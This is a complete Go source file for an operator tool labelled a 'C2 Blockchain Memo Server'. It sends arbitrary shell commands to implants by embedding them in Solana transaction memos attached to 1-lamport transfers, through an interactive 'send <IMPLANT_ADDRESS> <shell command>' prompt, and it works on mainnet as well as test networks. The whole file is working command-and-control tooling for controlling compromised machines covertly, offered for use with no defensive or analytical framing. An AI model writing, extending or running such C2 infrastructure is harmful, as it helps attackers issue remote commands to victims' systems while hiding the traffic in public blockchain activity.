// cmd/server/main.go — C2 Blockchain Memo Server (Operator Tool)
//
// Sends commands to implants by embedding them in Solana transaction
// memo fields. Each command is sent as a 1-lamport SOL transfer + memo
// instruction to the implant's wallet address.
//
// Usage:
//
//	# With a funded keypair (Solana CLI JSON-array format):
//	go run ./cmd/server --keypair ~/.config/solana/id.json --rpc devnet
//
//	# Generate a fresh ephemeral keypair (no SOL — for testing):
//	go run ./cmd/server
//
// Interactive commands once running:
//	send <IMPLANT_ADDRESS> <shell command>
//	balance
//	quit

package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/gagliardetto/solana-go"
	"github.com/gagliardetto/solana-go/programs/memo"
	"github.com/gagliardetto/solana-go/programs/system"
	"github.com/gagliardetto/solana-go/rpc"
)

func main() {
	var (
		keypairPath = flag.String("keypair", "", "Path to operator keypair (Solana CLI JSON array)")
		rpcEndpoint = flag.String("rpc", rpc.DevNet_RPC, "RPC endpoint: mainnet-beta, devnet, testnet, or custom URL")
	)
	flag.Parse()

	// Resolve named endpoints
	endpoint := resolveEndpoint(*rpcEndpoint)

	// ── Load or generate operator wallet ──────────────────────────────
	var operatorWallet solana.PrivateKey
	var err error

	if *keypairPath != "" {
		operatorWallet, err = loadKeypair(*keypairPath)
		if err != nil {
			log.Fatalf("Failed to load keypair from %q: %v", *keypairPath, err)
		}
		fmt.Printf("✅ Loaded operator wallet from %s\n", *keypairPath)
	} else {
		operatorWallet, err = solana.NewRandomPrivateKey()
		if err != nil {
			log.Fatalf("Failed to generate keypair: %v", err)
		}
		fmt.Println("⚠️  Generated ephemeral operator wallet (no SOL — use --keypair)")
	}

	operatorPub := operatorWallet.PublicKey()
	fmt.Printf("📍 Operator address: %s\n", operatorPub.String())
	fmt.Printf("🔗 RPC endpoint:    %s\n\n", endpoint)

	client := rpc.New(endpoint)
	ctx := context.Background()

	// ── Interactive REPL ──────────────────────────────────────────────
	scanner := bufio.NewScanner(os.Stdin)
	fmt.Println("━━━ C2 Blockchain Memo — Operator ━━━")
	fmt.Println("Commands:")
	fmt.Println("  send <ADDRESS> <command>   Send a shell command to an implant")
	fmt.Println("  balance                    Check operator wallet SOL balance")
	fmt.Println("  quit                       Exit")
	fmt.Println()

	for {
		fmt.Print("› ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.SplitN(line, " ", 3)
		switch parts[0] {
		case "quit", "exit", "q":
			fmt.Println("Bye.")
			return
		case "balance":
			checkBalance(ctx, client, operatorPub)
		case "send":
			if len(parts) < 3 {
				fmt.Println("Usage: send <IMPLANT_ADDRESS> <command>")
				continue
			}
			sendCommand(ctx, client, operatorWallet, parts[1], parts[2], endpoint)
		default:
			fmt.Printf("Unknown command: %q (try: send, balance, quit)\n", parts[0])
		}
	}
}

// ── Core: send a command as a memo transaction ──────────────────────

func sendCommand(
	ctx context.Context,
	client *rpc.Client,
	operator solana.PrivateKey,
	implantAddrStr, command string,
	endpoint string,
) {
	implantPubkey, err := solana.PublicKeyFromBase58(implantAddrStr)
	if err != nil {
		log.Printf("❌ Invalid implant address %q: %v", implantAddrStr, err)
		return
	}

	// 1. Get latest blockhash
	recent, err := client.GetLatestBlockhash(ctx, rpc.CommitmentFinalized)
	if err != nil {
		log.Printf("❌ Failed to get recent blockhash: %v", err)
		return
	}

	operatorPub := operator.PublicKey()

	// 2. Build transfer instruction (1 lamport — minimal cost,
	//    creates an on-chain footprint linking to the implant address)
	transferIx := system.NewTransferInstruction(
		1, // lamports
		operatorPub,
		implantPubkey,
	).Build()

	// 3. Build memo instruction with the command text
	memoIx, err := memo.NewMemoInstruction(
		[]byte(command),
		operatorPub,
	).ValidateAndBuild()
	if err != nil {
		log.Printf("❌ Failed to build memo instruction: %v", err)
		return
	}

	// 4. Build the transaction
	tx, err := solana.NewTransaction(
		[]solana.Instruction{transferIx, memoIx},
		recent.Value.Blockhash,
		solana.TransactionPayer(operatorPub),
	)
	if err != nil {
		log.Printf("❌ Failed to build transaction: %v", err)
		return
	}

	// 5. Sign
	_, err = tx.Sign(func(key solana.PublicKey) *solana.PrivateKey {
		if key.Equals(operatorPub) {
			return &operator
		}
		return nil
	})
	if err != nil {
		log.Printf("❌ Failed to sign transaction: %v", err)
		return
	}

	// 6. Send
	sig, err := client.SendTransaction(ctx, tx)
	if err != nil {
		log.Printf("❌ Failed to send transaction: %v", err)
		return
	}

	clusterParam := clusterParamFromEndpoint(endpoint)

	fmt.Printf("✅ Command sent!\n")
	fmt.Printf("   Signature: %s\n", sig.String())
	fmt.Printf("   Explorer:  https://solscan.io/tx/%s?%s\n", sig.String(), clusterParam)
	fmt.Printf("   Command:   %q\n", command)
	fmt.Printf("   Implant:   %s\n", implantAddrStr)
}

// ── Balance check ───────────────────────────────────────────────────

func checkBalance(ctx context.Context, client *rpc.Client, pubkey solana.PublicKey) {
	balance, err := client.GetBalance(ctx, pubkey, rpc.CommitmentFinalized)
	if err != nil {
		log.Printf("❌ Failed to check balance: %v", err)
		return
	}
	sol := float64(balance.Value) / 1e9
	fmt.Printf("💰 Balance: %.9f SOL (%d lamports)\n", sol, balance.Value)
}

// ── Keypair loading ─────────────────────────────────────────────────

func loadKeypair(path string) (solana.PrivateKey, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read file: %w", err)
	}

	content := strings.TrimSpace(string(data))

	// Base58-encoded private key string
	if !strings.HasPrefix(content, "[") {
		pk, err := solana.PrivateKeyFromBase58(content)
		if err != nil {
			return nil, fmt.Errorf("invalid base58 private key: %w", err)
		}
		return pk, nil
	}

	// Solana CLI format: JSON integer array [12, 34, 56, ...]
	var byteArr []byte
	if err := json.Unmarshal([]byte(content), &byteArr); err != nil {
		return nil, fmt.Errorf("JSON decode of keypair: %w", err)
	}
	if len(byteArr) != 64 {
		return nil, fmt.Errorf("expected 64 keypair bytes, got %d", len(byteArr))
	}

	return solana.PrivateKey(byteArr), nil
}

// ── Helpers ─────────────────────────────────────────────────────────

func resolveEndpoint(name string) string {
	switch strings.ToLower(name) {
	case "mainnet", "mainnet-beta", "main":
		return rpc.MainNetBeta_RPC
	case "devnet", "dev":
		return rpc.DevNet_RPC
	case "testnet", "test":
		return rpc.TestNet_RPC
	default:
		return name
	}
}

func clusterParamFromEndpoint(endpoint string) string {
	switch {
	case strings.Contains(endpoint, "mainnet"):
		return "cluster=mainnet-beta"
	case strings.Contains(endpoint, "devnet"):
		return "cluster=devnet"
	case strings.Contains(endpoint, "testnet"):
		return "cluster=testnet"
	default:
		return "cluster=custom&customUrl=" + endpoint
	}
}
